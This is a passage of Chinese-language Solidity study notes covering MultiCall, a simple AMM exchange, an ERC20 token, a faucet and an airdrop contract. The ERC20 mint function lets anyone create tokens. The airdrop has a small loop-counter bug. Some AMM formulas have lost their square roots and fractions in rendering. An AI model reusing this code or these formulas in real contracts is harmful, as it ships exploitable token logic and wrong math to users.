   * - 返回值要接近且不小于在同一交易进行销毁一定数额的金库额度所能赎回的基础资产数量<br>     * - 不要考虑 maxRedeem 等限制，假设用户的赎回交易会成功<br>     * - 要考虑费用<br>     * - 不能revert.<br>     */<br>    function previewRedeem(uint256 shares) external view returns (uint256 assets);<br><br>    /*//////////////////////////////////////////////////////////////<br>                     存款/提款限额逻辑<br>    //////////////////////////////////////////////////////////////*/<br>    /**<br>     * @dev 返回某个用户地址单次存款可存的最大基础资产数额。<br>     * - 如果有存款上限，那么返回值应该是个有限值<br>     * - 返回值不能超过 2 ** 256 - 1 <br>     * - 不能revert<br>     */<br>    function maxDeposit(address receiver) external view returns (uint256 maxAssets);<br><br>    /**<br>     * @dev 返回某个用户地址单次铸造可以铸造的最大金库额度<br>     * - 如果有铸造上限，那么返回值应该是个有限值<br>     * - 返回值不能超过 2 ** 256 - 1 <br>     * - 不能revert<br>     */<br>    function maxMint(address receiver) external view returns (uint256 maxShares);<br><br>    /**<br>     * @dev 返回某个用户地址单次取款可以提取的最大基础资产额度<br>     * - 返回值应该是个有限值<br>     * - 不能revert<br>     */<br>    function maxWithdraw(address owner) external view returns (uint256 maxAssets);<br><br>    /**<br>     * @dev 返回某个用户地址单次赎回可以销毁的最大金库额度<br>     * - 返回值应该是个有限值<br>     * - 如果没有其他限制，返回值应该是 balanceOf(owner)<br>     * - 不能revert<br>     */<br>    function maxRedeem(address owner) external view returns (uint256 maxShares);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="52-EIP712-类型化数据签名"><a href="#52-EIP712-类型化数据签名" class="headerlink" title="52. EIP712 类型化数据签名"></a>52. EIP712 类型化数据签名</h1><p><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/52_EIP712/readme.md">https://github.com/AmazingAng/WTF-Solidity/blob/main/52_EIP712/readme.md</a></p><h1 id="54-跨链桥"><a href="#54-跨链桥" class="headerlink" title="54. 跨链桥"></a>54. 跨链桥</h1><p><a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/54_CrossChainBridge">https://github.com/AmazingAng/WTF-Solidity/tree/main/54_CrossChainBridge</a></p><h1 id="55-多重调用"><a href="#55-多重调用" class="headerlink" title="55. 多重调用"></a>55. 多重调用</h1><h2 id="MultiCall"><a href="#MultiCall" class="headerlink" title="MultiCall"></a>MultiCall</h2><p>在Solidity中，MultiCall（多重调用）合约的设计能让我们在一次交易中执行多个函数调用。它的优点如下：</p><ol><li>方便性：MultiCall能让你在一次交易中对不同合约的不同函数进行调用，同时这些调用还可以使用不同的参数。比如你可以一次性查询多个地址的ERC20代币余额。</li><li>节省gas：MultiCall能将多个交易合并成一次交易中的多个调用，从而节省gas。</li><li>原子性：MultiCall能让用户在一笔交易中执行所有操作，保证所有操作要么全部成功，要么全部失败，这样就保持了原子性。比如，你可以按照特定的顺序进行一系列的代币交易。</li></ol><h2 id="MultiCall-合约"><a href="#MultiCall-合约" class="headerlink" title="MultiCall 合约"></a>MultiCall 合约</h2><p>接下来让我们一起来研究一下MultiCall合约，它由 MakerDAO 的 <a href="https://github.com/mds1/multicall/blob/main/src/Multicall3.sol">MultiCall</a> 简化而成。</p><p>MultiCall 合约定义了两个结构体:</p><ul><li><code>Call</code>: 这是一个调用结构体，包含要调用的目标合约 <code>target</code>，指示是否允许调用失败的标记 <code>allowFailure</code>，和要调用的字节码 <code>call data</code>。</li><li><code>Result</code>: 这是一个结果结构体，包含了指示调用是否成功的标记 <code>success</code>和调用返回的字节码 <code>return data</code>。</li></ul><p>该合约只包含了一个函数，用于执行多重调用：</p><ul><li><code>multicall()</code>: 这个函数的参数是一个由Call结构体组成的数组，这样做可以确保传入的target和data的长度一致。函数通过一个循环来执行多个调用，并在调用失败时回滚交易。</li></ul><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.19;<br><br>contract Multicall &#123;<br>    // Call结构体，包含目标合约target，是否允许调用失败allowFailure，和call data<br>    struct Call &#123;<br>        address target;<br>        bool allowFailure;<br>        bytes callData;<br>    &#125;<br><br>    // Result结构体，包含调用是否成功和return data<br>    struct Result &#123;<br>        bool success;<br>        bytes returnData;<br>    &#125;<br><br>    /// @notice 将多个调用（支持不同合约/不同方法/不同参数）合并到一次调用<br>    /// @param calls Call结构体组成的数组<br>    /// @return returnData Result结构体组成的数组<br>    function multicall(Call[] calldata calls) public returns (Result[] memory returnData) &#123;<br>        uint256 length = calls.length;<br>        returnData = new Result[](length);<br>        Call calldata calli;<br>        <br>        // 在循环中依次调用<br>        for (uint256 i = 0; i &lt; length; i++) &#123;<br>            Result memory result = returnData[i];<br>            calli = calls[i];<br>            (result.success, result.returnData) = calli.target.call(calli.callData);<br>            // 如果 calli.allowFailure 和 result.success 均为 false，则 revert<br>            if (!(calli.allowFailure || result.success))&#123;<br>                revert(&quot;Multicall: call failed&quot;);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="56-去中心化交易所"><a href="#56-去中心化交易所" class="headerlink" title="56. 去中心化交易所"></a>56. 去中心化交易所</h1><h2 id="自动做市商"><a href="#自动做市商" class="headerlink" title="自动做市商"></a>自动做市商</h2><p>自动做市商（Automated Market Maker，简称 AMM）是一种算法，或者说是一种在区块链上运行的智能合约，它允许数字资产之间的去中心化交易。AMM 的引入开创了一种全新的交易方式，无需传统的买家和卖家进行订单匹配，而是通过一种预设的数学公式（比如，常数乘积公式）创建一个流动性池，使得用户可以随时进行交易。</p><h2 id="去中心化交易所"><a href="#去中心化交易所" class="headerlink" title="去中心化交易所"></a>去中心化交易所</h2><p>下面，我们用智能合约写一个去中心化交易所 <code>SimpleSwap</code>，支持用户交易一对代币。</p><p><code>SimpleSwap</code> 继承了 ERC20 代币标准，方便记录流动性提供者提供的流动性。在构造器中，我们指定一对代币地址 <code>token0</code> 和 <code>token1</code>，交易所仅支持这对代币。<code>reserve0</code> 和 <code>reserve1</code> 记录了合约中代币的储备量。</p><blockquote><p>[!IMPORTANT]</p><p>交易所主要有两类参与者：流动性提供者（Liquidity Provider，LP）和交易者（Trader）。下面我们分别实现这两部分的功能。1</p></blockquote><h3 id="流动性提供者"><a href="#流动性提供者" class="headerlink" title="流动性提供者"></a>流动性提供者</h3><p>流动性提供者给市场提供流动性，让交易者获得更好的报价和流动性，并收取一定费用。</p><p><strong>增加流动性</strong></p><p>首先，我们需要实现添加流动性的功能。当用户向代币池添加流动性时，合约要记录添加的LP份额。根据 Uniswap V2，LP份额如下计算：</p><ol><li><p>代币池被首次添加流动性时，LP份额 ΔL 由添加代币数量乘积的平方根决定:</p><p>ΔL&#x3D;Δx∗Δy</p></li><li><p>非首次添加流动性时，LP份额由添加代币数量占池子代币储备量的比例决定（两个代币的比例取更小的那个）:</p><p>ΔL&#x3D;L∗min(Δxx,Δyy)</p></li></ol><p>因为 <code>SimpleSwap</code> 合约继承了 ERC20 代币标准，在计算好LP份额后，可以将份额以代币形式铸造给用户。</p><p>下面的 <code>addLiquidity()</code> 函数实现了添加流动性的功能，主要步骤如下：</p><ol><li>将用户添加的代币转入合约，需要用户事先给合约授权。</li><li>根据公式计算添加的流动性份额，并检查铸造的LP数量。</li><li>更新合约的代币储备量。</li><li>给流动性提供者铸造LP代币。</li><li>释放 <code>Mint</code> 事件。</li></ol><p><strong>移除流动性</strong></p><p>接下来，我们需要实现移除流动性的功能。当用户从池子中移除流动性 ΔL 时，合约要销毁LP份额代币，并按比例将代币返还给用户。返还代币的计算公式如下:</p><p>Δx&#x3D;ΔLL∗x</p><p>Δy&#x3D;ΔLL∗y</p><p>下面的 <code>removeLiquidity()</code> 函数实现移除流动性的功能，主要步骤如下：</p><ol><li>获取合约中的代币余额。</li><li>按LP的比例计算要转出的代币数量。</li><li>检查代币数量。</li><li>销毁LP份额。</li><li>将相应的代币转账给用户。</li><li>更新储备量。</li><li>释放 <code>Burn</code> 事件。</li></ol><p>至此，合约中与流动性提供者相关的功能完成了，接下来是交易的部分。</p><h3 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h3><p>在Swap合约中，用户可以使用一种代币交易另一种。那么我用 Δx单位的 token0，可以交换多少单位的 token1 呢？下面我们来简单推导一下。</p><p>根据恒定乘积公式，交易前：</p><p>k&#x3D;x∗y</p><p>交易后，有：</p><p>k&#x3D;(x+Δx)∗(y+Δy)</p><p>交易前后 k 值不变，联立上面等式，可以得到：</p><p>Δy&#x3D;−Δx∗yx+Δx</p><p>因此，可以交换到的代币数量 Δy 由 Δx，$x$，和 y 决定。注意 Δx 和 Δy 的符号相反，因为转入会增加代币储备量，而转出会减少。</p><p>下面的 <code>getAmountOut()</code> 实现了给定一个资产的数量和代币对的储备，计算交换另一个代币的数量。</p><p>有了这一核心公式后，我们可以着手实现交易功能了。下面的 <code>swap()</code> 函数实现了交易代币的功能，主要步骤如下：</p><ol><li>用户在调用函数时指定用于交换的代币数量，交换的代币地址，以及换出另一种代币的最低数量。</li><li>判断是 token0 交换 token1，还是 token1 交换 token0。</li><li>利用上面的公式，计算交换出代币的数量。</li><li>判断交换出的代币是否达到了用户指定的最低数量，这里类似于交易的滑点。</li><li>将用户的代币转入合约。</li><li>将交换的代币从合约转给用户。</li><li>更新合约的代币储备量。</li><li>释放 <code>Swap</code> 事件。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>08-5Solidity笔记之五ERC20ERC721</title>
    <link href="/2025/05/09/08-5Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%94/"/>
    <url>/2025/05/09/08-5Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h1 id="31-ERC20"><a href="#31-ERC20" class="headerlink" title="31. ERC20"></a>31. ERC20</h1><p><code>ERC20</code>是以太坊上的代币标准，来自2015年11月V神参与的<a href="https://eips.ethereum.org/EIPS/eip-20"><code>EIP20</code></a>。它实现了代币转账的基本逻辑：</p><ul><li>账户余额(balanceOf())</li><li>转账(transfer())</li><li>授权转账(transferFrom())</li><li>授权(approve())</li><li>代币总供给(totalSupply())</li><li>授权转账额度(allowance())</li><li>代币信息（可选）：名称(name())，代号(symbol())，小数位数(decimals())</li></ul><h2 id="IERC20"><a href="#IERC20" class="headerlink" title="IERC20"></a>IERC20</h2><p><code>IERC20</code>是<code>ERC20</code>代币标准的接口合约，规定了<code>ERC20</code>代币需要实现的函数和事件。 之所以需要定义接口，是因为有了规范后，就存在所有的<code>ERC20</code>代币都通用的函数名称，输入参数，输出参数。 在接口函数中，只需要定义函数名称，输入参数，输出参数，并不关心函数内部如何实现。 由此，函数就分为内部和外部两个内容，一个重点是实现，另一个是对外接口，约定共同数据。 这就是为什么需要<code>ERC20.sol</code>和<code>IERC20.sol</code>两个文件实现一个合约。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br><br>// 定义约束，一个接口<br>// 接口就是一个规范，有了这个规范，就存在所有的ERC20代币都通用的函数名称、输入参数、输出参数，<br>// 在接口函数中， 我们只需要定义函数名称、输入参数、输出参数，不需要关心函数内部如何实现的<br>// 由此，函数就分内部和外部两个内容，一个重点是实现，另一个是对外接口，约定共同数据，这就是为什么需要IERC20和ERC20两个文件实现一个合约<br><br><br>interface IERC20 &#123;<br><br>    /**<br>    * @dev 释放条件：当 `value` 单位的货币从账户 (`from`) 转账到另一账户 (`to`)时.<br>    */<br>    event Transfer(address indexed from, address indexed to, uint256 value);<br>    /**<br>    * @dev 释放条件：当 `value` 单位的货币从账户 (`owner`) 授权给另一账户 (`spender`)时.<br>    */<br>    event Approval(address indexed owner,address indexed spender,uint256 value);<br>    /**<br>    * @dev 返回代币总供给.<br>    */<br>    function totalSupply() external view returns (uint256);<br>    /**<br>    * @dev  返回账户`account`所持有的代币数.<br>    */<br>    function balanceOf(address account) external view returns (uint256);<br>    /**<br>     * @dev 转账 `amount` 单位代币，从调用者账户到另一账户 `to`.<br>     *<br>     * 如果成功，返回 `true`.<br>     *<br>     * 释放 &#123;Transfer&#125; 事件.<br>     */<br>    function transfer(address to, uint256 amount) external returns (bool);<br>    /**<br>     * @dev 返回`owner`账户授权给`spender`账户的额度，默认为0。<br>     *<br>     * 当&#123;approve&#125; 或 &#123;transferFrom&#125; 被调用时，`allowance`会改变.<br>     */<br>    function allowance(address owner, address spender) external view returns (uint256); <br>    /**<br>     * @dev 调用者账户给`spender`账户授权 `amount`数量代币。<br>     *<br>     * 如果成功，返回 `true`.<br>     *<br>     * 释放 &#123;Approval&#125; 事件.<br>     */<br>    function approve(address spender, uint256 amount) external returns (bool);<br>     /**<br>     * @dev 通过授权机制，从`from`账户向`to`账户转账`amount`数量代币。转账的部分会从调用者的`allowance`中扣除。<br>     *<br>     * 如果成功，返回 `true`.<br>     *<br>     * 释放 &#123;Transfer&#125; 事件.<br>     */<br>    function transferFrom(<br>        address from,<br>        address to,<br>        uint256 amount<br>    ) external returns (bool);<br><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实现ERC20"><a href="#实现ERC20" class="headerlink" title="实现ERC20"></a>实现ERC20</h2><p>现在我们写一个<code>ERC20</code>，将<code>IERC20</code>规定的函数简单实现。</p><h3 id="状态变量"><a href="#状态变量" class="headerlink" title="状态变量"></a>状态变量</h3><p>我们需要状态变量来记录账户余额，授权额度和代币信息。其中<code>balanceOf</code>, <code>allowance</code>和<code>totalSupply</code>为<code>public</code>类型，会自动生成一个同名<code>getter</code>函数，实现<code>IERC20</code>规定的<code>balanceOf()</code>, <code>allowance()</code>和<code>totalSupply()</code>。而<code>name</code>, <code>symbol</code>, <code>decimals</code>则对应代币的名称，代号和小数位数。</p><p><strong>注意</strong>：用<code>override</code>修饰<code>public</code>变量，会重写继承自父合约的与变量同名的<code>getter</code>函数，比如<code>IERC20</code>中的<code>balanceOf()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br><br>import &quot;./31_IERC20.sol&quot;;<br>// ERC20 是约束<br>// IERC20 就得是具体的实现了<br><br>contract ERC20 is IERC20&#123;<br>    // mapping(address =&gt; uint256) public override balanceOf;<br>    mapping(address =&gt; uint256 )public override balanceOf;<br>    // override 是用来 覆盖（重写）继承自父合约的同名变量或函数 的。<br>    // 注意：用override修饰public变量，会重写继承自父合约的与变量同名的getter函数，比如IERC20中的balanceOf()函数。<br><br>    mapping(address=&gt;mapping(address=&gt;uint256) )public override allowance;//授权余额<br>    uint256 public  override totalSupply;//总供应量<br>    string public name ;<br>    string public symbol ; // 币种symbol 留到传入的时候<br>    uint8 public decimals =18; // 18位小数精度写死<br>    // 接下来实现 balancesOf() 、 allowance() totalSupply()<br>    // 不用实现，public变量会自动生成同名的getter函数用来实现IERC20规定的方法<br>    // function balancesOf(address account)external view returns (uint256) &#123;<br>    //     // code<br>    // &#125;<br><br>    //  allowance，默认是0，变量会自动生成同名的getter函数用来实现IERC20规定的方法<br>    // function allowance(address owner,address spender)external view returns (uint256) &#123;<br>    //     // code<br>    // &#125;<br>    //  获取代币的总供应量--这个方法不用了，因为totalSupply变量会自动生成同名的getter函数用来实现IERC20规定的方法<br>    // function totalSupply()external view returns (uint256) &#123;<br>    //     // code<br>    // &#125;<br><br><br>    // 构造方法，部署合约的时候用来初始化 name 和 symbol<br>    constructor(string memory _name, string memory _symbol)&#123;<br>        name=_name;<br>        symbol=_symbol;<br>    &#125;<br>    // 授权方法，实现IERC20的approve函数，授权代币，<br>    // 被授权方spender可以支配授权方的amount数量的代币<br>    // spender 可以是EOA账户，也可以是合约账户，<br>    // 当你用uniswap交易代币的时候，，你需要将代币授权给uniswap合约<br>    function approve(address spender, uint256 amount) public  override  returns (bool) &#123;<br>        // code<br>        allowance[msg.sender][spender]=amount;<br>        emit Approval(msg.sender,spender,amount);<br>        return true;<br>    &#125;<br>    // 转账方法，实现IERC20的转账，<br>    // 调用方扣除自己的amunt 代币数量，接收方增加相应的代币数量<br>    // 土狗代币还会魔改这个函数，比如说加上税收、分红、抽奖等逻辑<br>    function transfer(address to,uint256 amount )public override returns (bool) &#123;<br>        // code<br>        balanceOf[msg.sender]-=amount;<br>        balanceOf[to]+=amount;<br>        emit  Transfer(msg.sender,to,amount);<br>        return true;<br><br>    &#125;<br>     // 转账方法，实现IERC20的转账，<br>     // 授权转账逻辑，被授权方将授权方sender的amount数量的代币的转账给接收方 recipient<br>    function transferFrom(address sender,address recipient,uint256 amount )public override returns (bool) &#123;<br>        // code<br>        allowance[sender][msg.sender]-=amount;<br>        balanceOf[sender]-=amount;<br>        balanceOf[recipient]+=amount;<br><br><br>        emit  Transfer(sender,recipient,amount);<br>        return true;<br>    &#125;<br>    // 最后还要有铸造和销毁，不然代币改怎么来勒？<br>    function mint(uint256 amount)external  &#123;<br>        balanceOf[msg.sender]+=amount;<br>        totalSupply+=amount;<br>        // address(0)就是0地址<br><br>        emit Transfer(address(0), msg.sender, amount); // 触发转移事件，给到铸造者<br>      <br>      //  emit Transfer(msg.sender, address(0), amount)<br>        // return true ;<br>    &#125;<br>    function burn(uint256 amount)external  &#123;<br>        balanceOf[msg.sender]-=amount;<br>        totalSupply-=amount;<br>        // address(0)就是0地址<br>        <br>        emit Transfer(msg.sender,address(0), amount); // 触发转移事件，给到铸造者<br>      <br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="31-EIp"><a href="#31-EIp" class="headerlink" title="31.EIp"></a>31.EIp</h1><p>e</p><h1 id="32-代币水龙头"><a href="#32-代币水龙头" class="headerlink" title="32. 代币水龙头"></a>32. 代币水龙头</h1><h2 id="ERC20水龙头合约"><a href="#ERC20水龙头合约" class="headerlink" title="ERC20水龙头合约"></a>ERC20水龙头合约</h2><p>这里，我们实现一个简版的<code>ERC20</code>水龙头，逻辑非常简单：我们将一些<code>ERC20</code>代币转到水龙头合约里，用户可以通过合约的<code>requestToken()</code>函数来领取<code>100</code>单位的代币，每个地址只能领一次。</p><h3 id="状态变量-1"><a href="#状态变量-1" class="headerlink" title="状态变量"></a>状态变量</h3><p>我们在水龙头合约中定义3个状态变量</p><ul><li><code>amountAllowed</code>设定每次能领取代币数量（默认为<code>100</code>，不是一百枚，因为代币有小数位数）。</li><li><code>tokenContract</code>记录发放的<code>ERC20</code>代币合约地址。</li><li><code>requestedAddress</code>记录领取过代币的地址。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Faucet&#123;<br>    // 我们定义三个变量<br>    // amuntAllowed 设定每次能领取代币数量(默认为100，不是100枚，因为代币有小数位数)<br>    // tokenContract 记录发放的ERC20代币合约地址<br>    // requestedAddress 记录领取过代币的地址<br>    uint256 public amuntAllowed = 100;<br>    address public tokenContract;<br>    mapping (address=&gt;bool) public requestedAddress;<br>    // 定义一个事件，来记录每次领取代币的地址和数量，再requestTokens()函数被调用时释放<br>    event SendToken(address indexed Receiver,uint256 indexed Amount);<br>    // 构造函数，用来初始化tokenContract 状态变量，确定发放的ERC20代币地址<br>    constructor(address _tokenContract)&#123;<br>        tokenContract=_tokenContract;<br>    &#125;<br>    // 领取代币函数<br>    function requestTokens()external  &#123;<br>        require(!requestedAddress[msg.sender],&quot;Can&#x27;t Request Multiple Times!&quot;);<br>        IERC20 token =IERC20(tokenContract);// token 是一个IERC20遍量<br>        require(token.balanceOf(address(this))&gt;=amuntAllowed,&quot;Faucet Empty!&quot;);//校验水龙头是否空了<br>        token.transfer(msg.sender, amuntAllowed); // 发送100代币<br>        requestedAddress[msg.sender]=true;<br>        emit SendToken(msg.sender,amuntAllowed);<br><br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="33-空投合约"><a href="#33-空投合约" class="headerlink" title="33. 空投合约"></a>33. 空投合约</h1><h3 id="空投代币合约"><a href="#空投代币合约" class="headerlink" title="空投代币合约"></a>空投代币合约</h3><p><code>Airdrop</code>空投合约逻辑非常简单：利用循环，一笔交易将<code>ERC20</code>代币发送给多个地址。合约中包含两个函数</p><ul><li><p><code>getSum()</code>函数：返回<code>uint</code>数组的和。</p></li><li><p><code>multiTransferToken()</code>函数：发送<code>ERC20</code>代币空投，包含<code>3</code>个参数：</p><ul><li><p><code>_token</code>：代币合约地址（<code>address</code>类型）</p></li><li><p><code>_addresses</code>：接收空投的用户地址数组（<code>address[]</code>类型）</p></li><li><p><code>_amounts</code>：空投数量数组，对应<code>_addresses</code>里每个地址的数量（<code>uint[]</code>类型）</p></li></ul></li></ul><p>该函数有两个检查：第一个<code>require</code>检查了<code>_addresses</code>和<code>_amounts</code>两个数组长度是否相等；第二个<code>require</code>检查了空投合约的授权额度大于要空投的代币数量总和。</p><p><code>multiTransferETH()</code>函数：发送<code>ETH</code>空投，包含<code>2</code>个参数：</p><ul><li><code>_addresses</code>：接收空投的用户地址数组（<code>address[]</code>类型）</li><li><code>_amounts</code>：空投数量数组，对应<code>_addresses</code>里每个地址的数量（<code>uint[]</code>类型）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Airdrop&#123;<br>    function multTransferToken(<br>        address _token,<br>        address[] calldata _addresses,<br>        uint256[] calldata _amounts <br>        ) external   &#123;<br>        // 检查地址和数组长度是否相等<br>        require(_addresses.length ==_amounts.length,&quot;Lengths of Addresses and Amounts NOT EQUA&quot;);<br>        IERC20 token = IERC20(_token);<br>        uint _amountSum=getSum(_amounts); // 计算空投代币的总理<br>        // 检查授权代币数量是否大于等于此次空投数量<br>        require(token.allowance(msg.sender,address(this))&gt;= _amountSum,&quot;Need Approve ERC20 token&quot; );<br>        // 通过for 循环，利用fransferFrom函数发放空投<br>        for (uint8 i ;i&lt;_addresses.length; i++)&#123;<br>            token.transferFrom(msg.sender,_addresses[i],_amounts[i]);<br>        &#125;<br>        <br>    &#125;<br>    mapping(address =&gt; uint) failTransferList;<br>    function multTransferETH(<br>        address[] calldata _addresses,<br>        uint256[] calldata _amounts<br>        )public payable  &#123;<br>        // 检查地址数组长度与金额数组长度是否相等<br>        require(_addresses.length ==_amounts.length,&quot;Lengths of Addresses and Amounts NOT EQUA&quot;);<br>        uint _amountSum=getSum(_amounts); // 计算空投代币的总数<br>        require(msg.value== _amountSum,&quot;Need Approve ERC20 token&quot; );<br>        for (uint256 i=0;i&lt;_addresses.length;i++)&#123;<br>            (bool success, )= _addresses[i].call&#123;value: _amounts[i]&#125;(&quot;&quot;);<br>            if (!success)&#123;<br>                failTransferList[_addresses[i]] = _amounts[i];<br>            &#125;<br>        &#125;<br>    &#125;<br>    // 给空投失败提供主动操作机会<br>    function withdrawFromFailList(address _to)public  &#123;<br>        uint failAmount=failTransferList[msg.sender];<br>        require(failAmount&gt;0,&quot;You are not in fail list&quot;);<br>        failTransferList[msg.sender]=0;<br>        (bool success, )=_to.call&#123;value:failAmount&#125;(&quot;&quot;);<br>        require(success,&quot;Fail withdraw&quot;);<br>    &#125;<br><br>    // 数组求和函数<br>    function getSum(uint256[] calldata _arr)public pure returns(uint sum) &#123;<br>        for(uint i=0;i&lt;_arr.length; i++) <br>            sum=sum+_arr[i];<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="34-ERC721【NFT】"><a href="#34-ERC721【NFT】" class="headerlink" title="34. ERC721【NFT】"></a>34. ERC721【NFT】</h1><h2 